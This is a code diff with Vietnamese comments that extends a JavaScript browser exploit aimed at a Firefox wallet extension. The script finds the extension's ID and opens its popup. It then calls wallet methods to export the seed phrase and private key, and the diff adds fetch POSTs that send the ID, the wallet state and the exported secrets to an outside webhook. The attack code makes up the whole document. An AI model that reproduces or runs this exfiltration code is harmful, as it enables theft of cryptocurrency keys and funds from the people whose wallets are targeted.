@@ -27,8 +27,20 @@
                 const src = script.src;
                 if (src && src.startsWith('moz-extension://')) {
                     extensionUrl = src;
-                    extensionId = src.split('/')[3];
-                    log(`✅ Found extension: ${extensionId}`);
+                    
+                    // CÁCH ĐÚNG: Dùng URL object để parse
+                    try {
+                        const url = new URL(src);
+                        extensionId = url.hostname; // Phần hostname chính là extension ID
+                        log(`✅ Found extension ID: ${extensionId}`);
+                        log(`✅ Full URL: ${src}`);
+                    } catch (e) {
+                        log(`❌ Error parsing URL: ${e.message}`);
+                        // Fallback: dùng split đúng index
+                        const parts = src.split('/');
+                        extensionId = parts[2]; // Index 2 là extension ID
+                        log(`✅ Found extension (fallback): ${extensionId}`);
+                    }
                     break;
                 }
             }
@@ -39,6 +51,7 @@
             }
             
             // Gửi extension ID về webhook
+            log(`📤 Sending extension ID to webhook: ${extensionId}`);
             fetch(`${WEBHOOK_URL}?extensionId=${extensionId}`);
             
             log('2. Setting up message listener...');
@@ -81,6 +94,8 @@
             
             // Mở popup
             const popupUrl = `moz-extension://${extensionId}/popup.html`;
+            log(`Popup URL: ${popupUrl}`);
+            
             const popup = window.open(popupUrl, '_blank', 'width=400,height=600');
             
             if (!popup) {
@@ -96,6 +111,7 @@
                 iframe.style.top = '10px';
                 iframe.style.right = '10px';
                 iframe.style.zIndex = '9999';
+                iframe.style.border = '4px solid black';
                 document.body.appendChild(iframe);
                 
                 log('Iframe added - check if messages appear');
@@ -105,11 +121,23 @@
             
             // Thử gửi message đến background script
             try {
+                log('Attempting to send message to background...');
                 const response = await chrome.runtime.sendMessage(extensionId, {
                     type: 'DICE_POPUP',
                     action: 'getState'
                 });
                 log('Background response:', response);
+                
+                // Gửi response về webhook
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'background_response',
+                        response
+                    })
+                });
+                
             } catch (e) {
                 log('Cannot send to background:', e.message);
             }
@@ -118,19 +146,61 @@
             if (window.ethereum) {
                 log('5. Testing wallet methods...');
                 
+                // Thử wallet_getState trước
+                try {
+                    const state = await window.ethereum.request({
+                        method: 'wallet_getState'
+                    });
+                    log('wallet_getState:', state);
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            type: 'wallet_state',
+                            state
+                        })
+                    });
+                } catch (e) {
+                    log('wallet_getState error:', e.message);
+                }
+                
+                // Thử wallet_exportMnemonic
                 try {
                     const result = await window.ethereum.request({
                         method: 'wallet_exportMnemonic'
                     });
                     log('wallet_exportMnemonic:', result);
-                } catch (e) {}
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            type: 'wallet_export',
+                            method: 'mnemonic',
+                            result
+                        })
+                    });
+                } catch (e) {
+                    log('wallet_exportMnemonic error:', e.message);
+                }
                 
+                // Thử wallet_exportPrivateKey
                 try {
                     const result = await window.ethereum.request({
                         method: 'wallet_exportPrivateKey'
                     });
                     log('wallet_exportPrivateKey:', result);
-                } catch (e) {}
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            type: 'wallet_export',
+                            method: 'privateKey',
+                            result
+                        })
+                    });
+                } catch (e) {
+                    log('wallet_exportPrivateKey error:', e.message);
+                }
             }
             
             log('=== Exploit running - check webhook ===');
